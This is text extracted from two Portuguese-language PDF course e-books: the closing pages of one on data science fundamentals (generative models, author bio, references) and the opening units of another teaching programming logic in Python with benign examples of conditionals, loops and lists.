Tudo sobre NLP: o que é? Quais os desafios? Disponível em: 
https://www.blip.ai/blog/tecnologia/nlp-processamento-linguagem-natural/ 
 
5.4 Modelos Generativos 
 

 
 
Um modelo generativo é uma abordagem na área de aprendizado de máquina 
que visa criar novos dados que se assemelham aos dados de treinamento. Ao 
contrário dos modelos discriminativos, que se concentram em prever a 
probabilidade de uma classe ou categoria específica para um dado conjunto de 
entrada, os modelos generativos têm como objetivo aprender a distribuição de 
probabilidade subjacente aos dados de treinamento. Isso permite que eles 
gerem novas amostras que são indistinguíveis das amostras originais. 
As Large Language Models (LLMs), como o GPT (Generative Pre-trained 
Transformer), também podem ser consideradas modelos generativos. Elas 
absorvem uma vasta quantidade de texto durante o treinamento e aprendem a 
estrutura, a gramática e o estilo das linguagens humanas. Posteriormente, 
podem gerar texto coerente e contextualmente relevante com base em uma dada 
entrada inicial. Assim como outros modelos generativos, as LLMs utilizam uma 
abordagem de aprendizado de máquina para criar novos exemplos de texto que, 
idealmente, se parecem com os dados de treinamento. 
No entanto, a diferença chave entre um modelo generativo tradicional, como uma 
GAN, e as LLMs reside no modo como geram novos dados. Enquanto as GANs 
geram dados diretamente no espaço de entrada, como imagens ou sons, as 
LLMs geram texto sequencialmente, palavra por palavra, com base na 
distribuição de probabilidade aprendida durante o treinamento. Isso permite que 
as LLMs capturem não apenas a estrutura estatística das palavras individuais, 
mas também a dependência de longo alcance entre elas, produzindo texto que 
mantém coerência e contexto. 
Além disso, as LLMs têm uma vantagem adicional na capacidade de realizar 
tarefas específicas, como tradução automática, sumarização de texto e geração 
de código, além de simplesmente gerar texto. Essa flexibilidade decorre da 
capacidade das LLMs de aprender representações latentes complexas dos 
dados durante o treinamento, permitindo-lhes entender e manipular informações 
de maneiras que vão além da simples geração de texto. Em resumo, embora as 
LLMs compartilhem o objetivo fundamental de gerar dados, sua arquitetura e 
aplicação diferem dos modelos generativos tradicionais, refletindo a 
complexidade e a versatilidade das abordagens contemporâneas em inteligência 
artificial. 
 
 
 
 

 
 
FINALIZAR 
 
Chegamos ao fim desta jornada de exploração dos fundamentos da Ciência de 
Dados. Durante esta disciplina, mergulhamos em conceitos essenciais e práticas 
fundamentais para dominar esta área  da tecnologia da informação. 
Começamos compreendendo a importância da Ciência de Dados na era da 
informação, explorando sua relação com a análise e engenharia de dados. 
Discutimos também a interseção entre inteligência artificial e ciência de dados, 
reconhecendo como essas disciplinas se complementam e impulsionam 
avanços significativos em diversos setores. 
Em seguida,  falamos sobre o universo das tecnologias e ferramentas em Ciência 
de Dados, explorando linguagens como Python e R, bem como exemplos de 
frameworks como Scikit-learn, Matplotlib, Seaborn e PyTorch. Investigamos 
plataformas e ambientes de desenvolvimento como Jupyter Notebooks e Google 
Colab, além de ferramentas de análise de dados como Tableau, PowerBI e 
outros frameworks. 
Na etapa seguinte, dedicamos tempo para compreender o processo de 
exploração e análise de dados, explorando métodos de visualização e técnicas 
de pré-processamento de dados. Reconhecemos a importância crucial da 
interpretação dos resultados na análise de dados, desenvolvendo habilidades 
críticas para avaliar e comunicar descobertas de forma clara e precisa. 
Finalmente, exploramos a modelagem e o aprendizado de máquina, abordando 
desde conceitos básicos até tipos de algoritmos, avaliação de modelos e 
desafios enfrentados nesse campo.  
Convido você a continuar explorando e aprofundando seus conhecimentos 
nesse fascinante campo da Ciência de Dados. Mantenha-se atualizado com as 
últimas tendências e tecnologias, e nunca deixe de praticar e aprimorar suas 
habilidades. Lembre-se de que a Ciência de Dados é um campo em constante 
evolução, e seu domínio pode abrir portas para oportunidades emocionantes em 
sua carreira profissional. 
Profa. Dra. Joelma de Moura Ferreira 
 
 

 
 
Sobre a autora 
 
Joelma de Moura Ferreira é doutora em Ciência da Computação pela 
Universidade Federal de Goiás, com mestrado em Ciência da Computação pela 
Universidade Federal de Goiás, MBA em Gerenciamento de Projetos pela 
Fundação Getúlio Vargas, especialização em Redes de Computadores pela 
Universidade Salgado de Oliveira, MBA em Tecnologia para Negócios: AI, Data 
Science e Big Data pela Pontifícia Universidade Católica do Rio Grande do Sul 
e graduação em Ciência da Computação pela Universidade Católica de Goiás. 
Tendo atuado por mais de 20 anos como docente de graduação e pós-graduação 
em diversas instituições de ensino superior, incluindo Faculdade Sul-Americana, 
Universidade Paulista, Faculdade Estácio de Sá de Goiás, Pontifícia 
Universidade Católica, Centro Universitário Alves Farias. Desempenhou a 
função de coordenadora do curso de graduação de Sistemas de Informação e 
dos cursos de pós-graduação em Gestão de Projetos, Gestão de Tecnologia da 
Informação e Arquitetura e Engenharia de Software no Centro Universitário Alves 
Faria, onde também exerceu a atividade de pesquisadora no Mestrado em 
Desenvolvimento R Fora do domínio acadêmico, exerce a função de Cientista 
de Dados no Tribunal de Justiça do Distrito Federal e Territórios. 
 
 
 
 
 
 
 
 
 

 
 
Referências Bibliográficas 
 
VALDATI, A.B, Inteligência artificial – IA, Contentus, 2020. 
GABRIEL, Martha. Inteligência Artificial: Do Zero ao Metaverso, Atlas, 2022. 
GÉRON, Aurélien . Mãos à Obra Aprendizado de Máquina com Scikit-Learn,  
GRUS, Joel. Data Science do Zero, Alta Books, 2019. 
RUSSEL, Stuart J.,  NORVIG, P. Inteligência Artificial - Uma Abordagem 
Moderna, LTC, 2022. 
KAUFMAN, D., Desmistificando a inteligência artificial, Autentica, 2022. 
EYSENCK, Michael W., EYSENCK, Christine.  Inteligência Artificial X 
Humanos: O que a Ciência Cognitiva nos Ensina ao Colocar Frente a Frente 
a Mente Humana e a IA. Artmed, 2023 
VILENKY, Renata. Inteligência Artificial - Uma oportunidade para você 
empreender. Expressa, 2021 
MILANI, A.M. et al. Visualização de Dados, SAGAH, 2020. 
 
 
  


--- Fim do arquivo: eBook - Fundamentos de Data Science.pdf ---

--- Começo do arquivo: eBook - Lógica de Programação.pdf ---

 
 
OBJETIVOS 
 
OBJETIVO GERAL 
Equipar os estudantes com uma compreensão robusta dos conceitos 
fundamentais de lógica de programação, incluindo estruturas de controle, 
estruturas de dados básicas, e princípios de algoritmos, capacitando-os a 
analisar problemas e desenvolver soluções eficazes através da programação. 
OBJETIVOS ESPECÍFICOS 
• Introduzir conceitos básicos de programação, incluindo variáveis, tipos de 
dados, operadores aritméticos e lógicos; 
• Ensinar o uso de estruturas de controle de fluxo, como condicionais (if-
else) e laços de repetição (for, while); 
• Apresentar estruturas de dados básicas, como arrays (vetores e 
matrizes); 
• Fomentar a habilidade de desenvolver algoritmos para resolver 
problemas; 
• Incutir boas práticas de programação, como a escrita de código limpo, 
comentários, uso de convenções de nomes, e desenvolvimento de 
códigos modulares e reutilizáveis. 
 
Conheça como esse conteúdo foi organizado! 
Unidade 1: Introdução à Lógica de Programação 
Unidade 2: Estruturas de decisão e repetição 
Unidade 3: Estruturas de dados 
Unidade 4: Modularização 
Unidade 5: Projeto de algoritmo 
 

 
 
UNIDADE 
1 
CONCEITOS 
INICIAIS 
DE 
LÓGICA 
DE 
PROGRAMAÇÃO 
 
É com grande prazer que damos início a essa jornada de aprendizado e 
descobertas. Nesta unidade, teremos a oportunidade de explorar os conceitos 
iniciais do fascinante universo da lógica de programação. 
OBJETIVOS DA UNIDADE 1  
Ao final dos estudos, você deverá ser capaz de: 
• Definição de conceitos básicos de lógica. 
• Configuração do ambiente. 
 
 

 
 
1.1 AMBIENTE DE DESENVOLVIMENTO NO GOOGLE COLAB 
O Google fornece uma plataforma de desenvolvimento para projetos de 
ciência de dados e inteligência artificial chamada Colab. Esse ambiente é gratuito 
para utilização, podendo fornecer recursos computacionais extras por meio de 
pagamento. A Figura 1.1 abaixo mostra a página inicial que pode ser acessada 
por meio do link https://colab.research.google.com. 
 
Figura 1.1: Página inicial do Google Colab 
A plataforma possui diversos exemplos e tutoriais e todos estão 
acessíveis já na aba Exemplos como mostrado na Figura 1.1. Para iniciar um 
projeto basta clicar no botão azul Novo notebook. Todos os códigos que serão 
apresentados nesse texto podem ser desenvolvidos no ambiente do Google 
Colab. A vantagem é que as principais bibliotecas da linguagem Python já estão 
instaladas nesse ambiente, facilitando muito o início do desenvolvimento de um 
projeto. Obviamente é possível instalar bibliotecas caso elas não estejam 
disponíveis de início no ambiente. 
 
 

 
 
1.2. CARACTERIZAÇÃO DE UM ALGORITMO, TIPOS DE DADOS, 
CONSTANTES E COMENTÁRIOS 
Um algoritmo pode ser entendido como uma sequência de passos ou 
regras previamente definidas para executar uma tarefa. Imagine que ir ao 
supermercado pode ser visto como um algoritmo. Existem alguns passos que 
normalmente se repetem a cada nova compra: definir a lista de compras, entrar 
no carro, dirigir até o mercado, fazer as compras, passar no caixa e pagar a 
conta, retornar para casa. Obviamente podem existir etapas distintas, mas no 
geral, é algo próximo a isso. A lógica nos conduz na implementação e 
interpretação de algoritmos. Em geral, no mundo da programação, existem 
vários tipos de dados, e variações de acordo com a linguagem de programação. 
Especificamente em Python, para os números, temos os inteiros e os pontos 
flutuantes, que são int e float respectivamente. Para as letras, caracteres em 
geral e palavras (texto) temos o tipo str. O tipo bool é caracterizado por definir o 
que é verdadeiro e o que é falso. A Figura 1.2 abaixo ilustra o comando type do 
Python analisando alguns tipos. 
 
Figura 1.2: Tipos de dados em Python 

 
 
 
Figura 1.3: Definição de variáveis e seus tipos em Python 
 
 
As três primeiras células da Figura 1.3 definem as variáveis “palavra”, “numero” 
e “escolha”. Perceba o uso do símbolo “=” na atribuição de valor à uma variável (Mueller, 
2020). Na sequência o comando type verifica os tipos de cada uma (str, int, bool). Veja 
que a penúltima célula atribui o valor 5.6 à variável “numero” e a última célula verifica 
seu tipo novamente, que agora passa a ser float. O Python se destaca por sua simplicidade 
e facilidade no aprendizado. As definições são feitas sem o uso de “;”, comum em quase 

 
 
todas as linguagens de programação. Além disso, o tipo da variável é automaticamente 
inferido pelo Python, não sendo necessária uma declaração explícita, e quando é alterado, 
a própria linguagem se encarrega de compreender isso (veja o que acontece com 
“numero”). Por convenção, constantes em Python são declaradas utilizando letras 
maiúsculas, veja: PI = 3.14, E = 2.718. 
Muitas vezes se faz necessário inserir comentários no código, de maneira que o 
Python ignore tais instruções. Para isso basta colocar # e escrever na frente. É possível 
também fazer comentário em blocos utilizando três aspas duplas em sequência “””. A 
Figura 1.4 abaixo ilustra os comentários no código. 
 
Figura 1.4: Comentários em Python 
 
 
 
 
 
 
 
 
 

 
 
1.3. OPERADORES ARITMÉTICOS, RELACIONAIS E LÓGICOS 
Os operadores aritméticos em Python são: 
• Adição: + 
• Subtração: - 
• Multiplicação: * 
• Divisão: / 
• Divisão inteira: // 
• Módulo (resto da divisão): % 
• Potenciação: ** 
Esses operadores são basicamente o que se vê em matemática e, portanto, 
autoexplicativos com exceção dos três últimos. A Divisão inteira divide um 
número por outro e trunca o resultado para o número inteiro mais próximo, o 
módulo divide um número por outro e apresenta no resultado o resto da divisão 
e a potenciação, que também se vê na matemática, calcula o resultado de um 
número elevado ao outro. A Figura 1.5 a seguir ilustra a utilização dos 
operadores. Obviamente o uso de 4 e 2 foi proposital (qualquer número pode ser 
utilizado) até para verificar o efeito dos operadores de divisão, divisão inteira e 
resto da divisão.  

 
 
 
Figura 1.5: Operadores aritméticos 
Os operadores relacionais são: 
• Igual a: == 
• Diferente de: != 
• Maior que: > 
• Maior ou igual a: >= 
• Menor que: < 
• Menor ou igual a: <= 
Eles basicamente estabelecem a relação entre as parcelas ao fazerem as 
comparações. A Figura 1.6 mostra alguns exemplos de utilização dos 
operadores relacionais. 

 
 
 
Figura 1.6: Exemplos de utilização de operadores relacionais 
 
 
 
Os operadores lógicos são: 
• E lógico: and 
• Ou lógico: or 
• Não lógico: not 
Utilizar os operadores lógicos em conjunto com os demais dá muita flexibilidade 
para modelar diversas situações. Veja a Figura 1.7 a seguir alguns exemplos de 
utilização. 

 
 
 
Figura 1.7: Exemplos de utilização dos operadores lógicos 
Obviamente todas as situações apresentadas nas figuras anteriores são 
muito simples e tem propósito didático. Situações mais complexas irão surgir ao 
longo do texto e o uso desses operadores fará ainda mais sentido. 
 
 
1.4. COMANDOS DE ENTRADA E SAÍDA 
A construção de algoritmos naturalmente demanda por entradas e saídas de 
dados. Em Python contamos com dois comandos básicos nesse sentido: print e 
input. 
• print: Imprime na tela uma informação 
• input: Solicita a entrada uma informação ao usuário 
Os comandos print e input fazem parte de um conjunto de palavras 
reservadas que fazem parte da linguagem de programação Python. Tais 

 
 
palavras são utilizadas para acionar determinadas ações ou implementações. Ao 
longo do curso veremos diversas delas. 
Veja a Figura 1.8 abaixo para ter uma ideia melhor da utilização desses 
comandos. 
 
Figura 1.8: Utilização de comandos input e print 
O comando input recebe uma informação digitada pelo usuário e ele 
precisa de um argumento do tipo str que simplesmente possui uma mensagem 
explicando o que deve ser inserido. O comando input retorna str e por isso, na 
segunda linha, foi utilizado o comando float() passando o input entre parêntesis 
para que o retorno seja convertido em um número do tipo float. A terceira linha 
utiliza o \n como um caractere para produzir espaço em branco entre as linhas. 
Finalmente as duas últimas linhas da célula possuem os comandos print para 
imprimir o nome e o número digitados. Veja que uma letra f é inserida antes das 
aspas. Isso se deve a uma funcionalidade do Python conhecida como 
interpolação de strings. Exatamente no local do texto no qual uma variável deve 
aparecer, ela é inserida entre chaves, como visto nos dois últimos comandos 
print. 
 

 
 
UNIDADE 2 ESTRUTURAS DE DECISÃO E REPETIÇÃO 
 
Tivemos uma ideia básica a respeito do funcionamento da linguagem 
Python além de alguns exemplos simples tratando dos aspectos lógicos. A partir 
de agora iniciaremos as estruturas de decisão e repetição. Nessa parte o 
raciocínio lógico aparece de forma mais explícita e é possível produzir exemplos 
mais complexos que exigem mais do raciocínio. 
Espero que o leitor esteja empolgado para continuar a jornada e 
mergulhar um pouco mais fundo no mundo da tecnologia. 
OBJETIVOS DA UNIDADE 2 
Ao final dos estudos, você deverá ser capaz de: 
• Implementar código contendo blocos lógicos com aspectos de decisão e 
repetição 
 
• Compreender a modelagem de situações mais complexas 
 
 
 

 
 
2.1. ESTRUTURA CONDICIONAL SIMPLES 
Diversas situações reais em nosso cotidiano exigem a tomada de decisão 
e na lógica de programação não é diferente. As instruções que viabilizam a 
tomada de decisão no algoritmo são o if e o else (Manzano & Oliveira, 2019). O 
if, em tradução literal “se” avalia se uma condição é satisfeita, e caso positivo 
executa o que vem logo abaixo. Caso contrário o que está imediatamente abaixo 
do else (“senão”) será executado. Vamos iniciar essa parte imaginando a 
situação em que um sistema de cobrança avalia se o pagamento foi realizado 
até a data de vencimento ou não para liberar um código de pagamento. Caso a 
data seja inferior ou igual à data de vencimento a cobrança é feita sem o 
acréscimo de juros e, caso contrário, 2.5% de juros irão incidir sobre o valor 
original. Veja o trecho de código abaixo que implementa a lógica para resolver 
essa situação. 
data_vencimento = 28 
data_atual = 29 
 
if data_atual <= data_vencimento: 
    print('O valor a ser pago é R$200,00\n') 
else: 
    juros = 200*0.025 
    novo_valor = 200 + juros 
    print(f'O valor a ser pago é {novo_valor}\n') 
 
No trecho acima temos a data atual (pagamento) superior à data de 
vencimento e por isso teremos a incidência de juros. A terceira linha possui a 
instrução if que verifica se a data atual é menor ou igual à data de vencimento e 
caso isso seja verdade, o código passa para a próxima linha que imprime o valor 
original de R$200,00. Caso contrário, a instrução else apresenta o que deve ser 
feito. Uma simples expressão matemática calcula o percentual e na sequência 
aplica a soma que então é impressa na tela como o resultado. 
Observe que em Python não há necessidade do uso de “;”. Além disso, 
veja a indentação (espaço em branco) logo abaixo do if e do else. Python 
entende que tudo que está imediatamente alinhado com essa indentação está 

 
 
dentro do comando acima. Além disso é necessário inserir “:” ao final de cada 
linha de if e else. 
Veja mais um exemplo abaixo: 
 
nome_usuario = 'Thiago' 
horario_limite = 18 
 
if nome_usuario == 'Thiago' and horario_limite <= 18: 
    print('Acesso liberado!') 
else: 
    print('Acesso negado!') 
 
No trecho de código acima além de fazer uma comparação com um texto 
(str) uma segunda condição é necessária (horário limite). O acesso só é liberado 
caso as duas condições sejam satisfeitas ao mesmo tempo, caso contrário o 
acesso é negado. As possibilidades são inúmeras no caso de estruturas 
condicionais e cabe ao leitor estudar e se aprofundar. 
 
2.2. ESTRUTURA CONDICIONAL COMPOSTA 
Para expandir o conceito visto na seção anterior a respeito de estrutura 
condicional iremos aumentar um pouco a complexidade da tomada de decisão. 
Imagine novamente a situação do sistema de cobrança. Caso a data de 
pagamento seja inferior ou igual à data de vencimento, a cobrança é feita sem o 
acréscimo de juros, caso o pagamento esteja em atraso de até cinco dias, uma 
taxa de 2,5% irá incidir sobre o valor original. Finalmente, caso o atraso seja 
superior a cinco dias, uma taxa de 5,25% irá incidir sobre o valor principal. Para 
resolver essa situação precisamos montar uma estrutura que seja capaz de 
avaliar três cenários distintos, sendo eles, pagamento em dias, atraso de até 
cinco dias e atraso superior a cinco dias. Aqui entra uma nova parte da lógica de 
estrutura condicional com o elif. Essa palavra é uma abreviação para else if e 
significa que existe uma outra possibilidade. Veja o trecho de código abaixo. 
data_vencimento = 25 
data_atual = 31 

 
 
 
if data_atual <= data_vencimento: 
    print('O valor a ser pago é R$200,00\n') 
elif data_atual - data_vencimento <= 5: 
    juros = 200*0.025 
    novo_valor = 200 + juros 
    print(f'O valor a ser pago é {novo_valor}\n') 
else: 
    juros = 200*0.0525 
    novo_valor = 200 + juros 
    print(f'O valor a ser pago é {novo_valor}\n') 
 
Agora temos uma terceira possibilidade para a decisão. Dessa forma, se 
estiver dentro do prazo correto (antes do vencimento) não há cobrança de taxa, 
se o atraso for de até 5 dias, a taxa é 2,5% e todas as outras possibilidades vão 
para a terceira parte. É possível colocar diversas condições, portanto, poderia 
existir o prazo entre 5 e 10 dias de atraso, entre 10 e 15 dias de atraso e por aí 
vai. Tudo depende do problema que está sendo implementado. 
 
2.3. ESTRUTURAS DE REPETIÇÃO 
Estruturas de repetição são extremamente úteis e fazem parte da rotina 
diária dos profissionais que utilizam linguagens de programação. Aqui, iremos 
aprender como utilizar for e while que são as palavras reservadas da linguagem 
Python para implementar os blocos de repetição (Lambert, 2022). 
FOR 
Vamos apresentar um exemplo para facilitar o entendimento. Imagine 
uma situação na qual tem-se um conjunto de anotações de um supermercado 
que representam a quantidade de dias restantes para determinados produtos 
perderem a validade. O gerente preocupado com a situação solicita uma 
investigação na lista no intuito de obter tudo que irá vencer em 7 dias ou menos. 
O trecho de código abaixo ilustra duas implementações. Na primeira, todos os 
valores são impressos e na segunda, apenas os valores menores ou iguais a 
sete. 
 

 
 
lista_de_vencimento_de_produtos = [5, 12, 31, 60, 8, 7, 45, 98, 6, 
108] 
 
for item in lista_de_vencimento_de_produtos: 
    print(f'Quantidade de dias para o vencimento do produto - {item}') 
 
A primeira linha do trecho de código acima introduz uma estrutura de 
dados comum em Python, conhecida como lista. Ela é definida por colchetes “[]”. 
Dessa forma, temos a lista_de_vencimento_de_produtos contendo os dias 
restantes para o vencimento de cada produto. Para fins de simplicidade do 
código, não iremos inserir os nomes dos produtos. Na segunda linha do trecho 
de código, o comando for aparece e em tradução literal significa para. Na prática 
essa 
linha 
quer 
dizer 
o 
seguinte: 
para 
cada 
item 
da 
lista_de_vencimento_de_produtos faça. A instrução encerra a linha com “:” e 
tudo que está abaixo do comando for, indentado será compreendido como um 
comando a ser executado. Nesse caso, os itens da lista são impressos na tela 
com uma mensagem. Observe o conceito de interpolação de strings já 
mencionado anteriormente com o item entre chaves na terceira linha do código. 
Veja o resultado na Figura 2.1 abaixo: 
 
Figura 2.1: Implementação do comando for para impressão de valores em uma 
lista 
A Figura 2.2 abaixo implementa a situação descrita inicialmente no texto 
que é verificar produtos com data de vencimento igual ou inferior a sete. 

 
 
 
Figura 2.2: Implementação do comando for juntamente com if para testar 
produtos de acordo com os dias restantes para vencimento 
Na Figura 2.2 o comando for (também conhecido como laço de repetição) 
é combinado com uma estrutura de decisão (if) para avaliar se cada elemento 
da lista é menor ou igual a 7. Veja que apenas os números que se encaixam 
nessa condição são impressos como resultado. 
WHILE 
Outra maneira de avaliar situações de maneira repetida é o comando 
while, que em tradução literal significa enquanto. De forma simples, quer dizer, 
enquanto algo acontecer, repita as instruções. Veja a implementação da situação 
dos dias de vencimento dos produtos utilizando while no trecho de código abaixo 
(Figura 2.3). 
 
Figura 2.3: Implementação do comando while juntamente com if para testar 
produtos de acordo com os dias restantes para vencimento 
 

 
 
Para utilizar o while é necessário definir um critério de parada, o que torna 
o comando bastante flexível. Nesse caso o critério foi o tamanho da lista de 
valores, ou seja, enquanto o índice definido na linha 3 for menor do que o 
tamanho da lista o Python mantém a execução ativa. Na linha 8 o índice é 
incrementado (valor atual + 1) em 1 a cada rodada. Em resumo, esse bloco da 
Figura 2.3 avalia os elementos da lista de valores, um a um (cada rodada do 
while), e quando são menores ou iguais a 7, são impressos, na sequência a 
variável índice é incrementada em 1 e o fluxo segue até que a variável índice 
tenha o valor 10 (quantidade de valores na lista, ou seja, seu tamanho).  
Uma observação importante é que a maioria das linguagens de 
programação, incluindo Python, o índice de estruturas como listas iniciam em 0 
e não em 1. O índice (index) é uma maneira de achar em qual posição o elemento 
está na lista. Na linha 6 da Figura 2.3 é mostrada a variável 
lista_de_vencimento_de_produtos com dois colchetes na frente e a variável 
índice dentro “[indice]”. Essa forma de representação é o que indica a posição 
de um elemento na lista. Portanto, se a variável índice, em determinado 
momento tiver o valor 4, indica que estamos interessados em obter o elemento 
da lista que está na posição 4. Em nosso exemplo, o elemento que ocupa a 
posição 4 na lista é o 8 (Figura 2.3 na linha 1), lembrando que o índice começa 
em zero. 
Um outro exemplo de utilização do while é exibido no trecho de código na Figura 
2.4 abaixo. 
 

 
 
 
Figura 2.4: Implementação do comando while juntamente com if e uma variável 
do tipo bool para exibir os elementos em uma lista 
 
Na prática, o código exibido na Figura 1.9 anteriormente é suficiente para 
exibir os valores da lista, mas para fins ilustrativos, a Figura 1.12 apresenta uma 
outra maneira de fazer. Aqui, uma variável do tipo bool é criada na linha 1 e o 
while verifica se essa variável permanece como verdadeira (True) para continuar 
sua execução (linha 5). A linha 9 analisa o tamanho da lista, e em caso de a 
variável índice ter o mesmo valor que o tamanho da lista, a condição é verificada 
e a variável flag é alterada para False (linha 10). O restante do código contém a 
lógica de impressão de valores contidos na lista. Em termos práticos, esse 
código dá voltas e faz mais do que é necessário para exibir os valores, mas vale 
reforçar, foi apenas um exemplo para ilustrar a combinação das estruturas já 
vistas até aqui no texto. 
 
 
 
 

 
 
2.4. EXPRESSÕES ARITMÉTICAS 
 
Expressões aritméticas no Python seguem exatamente a mesma ideia já 
vista nas aulas de matemática na escola (ensino fundamental). Python 
compreende a precedência de operadores e obviamente é possível utilizar 
parêntesis para completar a lógica desejada no que tange às operações que 
devem ser realizadas antes. Relembre a fórmula de Bháskara na Equação 2.1 
abaixo: 
 
𝑥=
!"±√"!!%&'
(&
                                   Equação 2.1 
 
O trecho de código abaixo implementa as operações necessárias para 
solucionar essa equação. Aqui faremos uso da biblioteca math, que adiciona 
capacidades ao Python. 
 
import math 
 
a = 4 
b = 2 
c = -1 
 
delta = b**2 - 4*a*c 
 
x1 = (-b + math.sqrt(delta))/(2*a) 
x2 = (-b - math.sqrt(delta))/(2*a) 
 
No trecho acima, a primeira linha importa a biblioteca math, os elementos 
a, b e c de uma equação do segundo grau são definidos. A seguir, o termo que 
fica dentro da raiz quadrada (Equação 2.1) pode ser calculado de maneira 
separada (delta). Veja que nenhum parêntesis precisa ser inserido aqui, pois o 
Python sabe a potenciação e o produto devem ser resolvidos antes da subtração.  

 
 
As duas últimas linhas (x1 e x2) exibem o cálculo final (parte positiva e 
parte negativa) com o auxílio de parêntesis para especificar que a tudo que está 
dentro será dividido por 2a. A Figura 2.5 abaixo ilustra alguns trechos de código 
que fazem uso de expressões aritméticas no Python. 
 
Figura 2.5: Algumas expressões aritméticas em Python 
 
 
 
 
 
 
 
 

 
 
UNIDADE 3 ESTRUTURAS DE DADOS 
 
Nesse momento já somos capazes de aplicar diversas operações e utilizar 
várias estruturas lógicas para tomada de decisão e para repetições de 
instruções. Vamos agora aprofundar na utilização de estruturas de dados, que 
são blocos chave para construção de sistemas mais complexos. 
OBJETIVOS DA UNIDADE 3 
Ao final dos estudos, você deverá ser capaz de: 
• Implementar lógicas que façam uso de vetores e matrizes 
 
• Realizar operações com essas estruturas 
 
 
 
 
 
 
 
 
 
 
 
 
 
 

 
 
3.1. VETORES UNIDIMENSIONAIS 
Vetores unidimensionais, também conhecidos como arrays, são 
estruturas de dados focadas em organizar coleções de informações. Em Python 
a maneira mais simples e direta de organizar dados dessa forma é utilizar as 
listas (a seção 2.3 apresentou o uso de listas de forma muito simplificada). As 
listas podem ser definidas por colchetes, como por exemplo: [3, 4, 5], [‘banana’, 
‘morango’], [True, False, False, True]. 
A ideia dessas estruturas pode ser vista na Figura 3.1 abaixo na qual 
temos oito posições numeradas de 0 a 7. Em cada posição um valor é 
armazenado. 
 
Figura 3.1: Estrutura de um vetor unidimensional (array) 
 
 
 
 
 

 
 
Para se ter acesso a um valor da lista basta utilizar seu índice (index). 
Suponha que a lista acima seja nomeada como “numeros”. Dessa forma, poderia 
ser definida da seguinte maneira: numeros = [5, 8, 1, 9, 2, 3, 7, 0]. Para acessar 
o número 3 por exemplo, basta fazer numeros[5] (veja o uso dos colchetes com 
o índice dentro). A lista é uma estrutura muito dinâmica em Python possuindo 
diversas operações e manipulações bastante facilitadas. O objetivo desse texto 
não é aprofundar em todas as características das listas, mas dar uma base para 
o leitor se aperfeiçoar posteriormente. Para adicionar um novo elemento à lista, 
basta utilizar o método append(), passando entre os parêntesis o valor a ser 
incluído. Por exemplo, para incluir o número 13, faz-se numeros.append(13) e 
para remover um elemento utiliza-se o método remove(), numeros.remove(1). 
Vale ressaltar que o método remove() retorna um erro no caso em que o 
elemento solicitado a ser removido não existe na lista. Para alterar um elemento 
da lista, por exemplo, inserir no lugar do número 5 na primeira posição o número 
13, basta fazer numeros[0] = 13 (observe que a primeira posição é representada 
pelo índice 0). 
 
Todas as operações aritméticas citadas anteriormente na seção 2.1 
podem ser utilizadas com vetores (listas). O detalhe fica por conta de acessar os 
elementos por meio dos índices e então realizar as operações. O trecho de 
código apresentado na Figura 3.2 abaixo mostra a implementação do cálculo da 
média dos valores em uma lista. 
 
Figura 3.2: Cálculo da média dos valores contidos em uma lista 

 
 
A linha 1 define a lista com os números, a linha 2 define uma variável 
soma iniciando em 0 que servirá como auxílio para calcular a média. Nas linhas 
3 e 4 um laço for é utilizado para percorrer os elementos da lista. Observe o 
comando len() que calcula o tamanho da lista (nesse caso é 4). Portanto aqui, o 
índice i que é apenas uma variável auxiliar para utilização do for, irá variar de 0 
a 3, graças ao comando range(). A variável soma é incrementada em cada 
rodada pelo valor das notas em cada posição. Na prática, significa que a soma 
irá acumular cada valor da lista (6.5 + 6.0 + 7.8 + 7.5). Finalmente a linha 5 
calcula a média dividindo o valor da soma dos elementos pelo total de elementos 
na lista e a linha 6 imprime o resultado. 
Vale destacar uma observação muito importante em relação ao comando 
for e sua utilização para percorrer elementos de listas. Na seção 2.3 foi 
apresentada uma maneira de percorrer a lista que obtém o elemento contido nela 
de maneira direta e na Figura 3.2 acima, os elementos são acessados por meio 
de suas posições (índice). A Figura 3.3 ajuda a compreender melhor o conceito 
ao apresentar outra maneira de reproduzir o cálculo da média dos valores na 
lista. 
 
Figura 3.3: Cálculo da média dos valores contidos em uma lista utilizando os 
índices 
 

 
 
Comparando a metodologia na Figura 3.2 e na Figura 3.3 é possível ver 
que a grande diferença é que na primeira ao fazer uso dos métodos range() e 
len() o laço de repetição for acessa os valores da lista de acordo com seus 
índices, ou seja, notas[i], uma vez que a variável i inicia em 0 e termina em 4, 
enquanto isso, na Figura 3.3 o acesso aos valores da lista é feito de forma direta 
(linha 3). Ainda vale destacar que o Python, ao trabalhar com valores em uma 
faixa (range), sempre para um elemento antes do último, ou seja, se temos uma 
faixa de 0 a 4, o último elemento acessado será o 3, o que faz sentido, visto que 
uma lista com tamanho quatro inicia seu índice em 0 e termina em 3. 
 
3.2. VETORES MULTIDIMENSIONAIS 
Os vetores multidimensionais, também conhecidos como matrizes, são 
um formato muito utilizado na computação. É muito natural representar 
informações em formato matricial, visto que qualquer tabela do cotidiano 
apresenta dados e é facilmente interpretada. Em Python é possível combinar 
listas para se obter o comportamento de matrizes (duas dimensões – linha e 
coluna). A Figura 3.4 a seguir mostra um trecho de código que cria uma lista com 
duas dimensões. 

 
 
 
Figura 3.4: Criação de uma lista com duas dimensões e impressão de valores 
 
A primeira célula da Figura 3.4 acima, na linha 1 define uma matriz, que 
na prática é uma lista contendo outras listas. Veja que os colchetes externos 
definem uma lista maior que é composta pelas listas menores contendo os 
valores. As linhas 3 e 4 da primeira célula utilizam o for para imprimir em formato 
matricial, mais natural para nós. Além disso, a segunda célula utiliza dois laços 
for para imprimir os valores da matriz, sendo o primeiro for para percorrer as 
linhas (0 a 3) e o segundo for para percorrer as colunas (0 a 2). Perceba a 
utilização de dois índices na frente de notas na linha 3 da segunda célula. O 
primeiro índice indica a linha e o segundo a coluna. A título de exemplo, pode-
se imaginar a matriz de notas da seguinte maneira: as linhas representando 
alunos diferentes e as colunas representando as disciplinas português e 
matemática. 

 
 
Para adicionar ou remover elementos nesse formato, utilizando os 
métodos append() e remove() é necessário lidar com as listas menores dentro 
da lista maior, o que pode ser um pouco problemático. Para a alteração (edição) 
de valores, basta encontrar a posição por meio dos índices de linha e coluna e 
atribuir um novo valor (por exemplo: notas[1][1] = 9.9). 
Vamos verificar agora a média de cada coluna da matriz notas, lembrando 
que a primeira coluna se refere à português e a segunda coluna matemática. 
 
Figura 3.5: Cálculo da média dos valores por coluna na matriz 
A Figura 3.5 acima ilustra o uso de uma estrutura de repetição (for) para 
percorrer as linhas da matriz e somar os elementos. As linhas 7 e 8 da primeira 
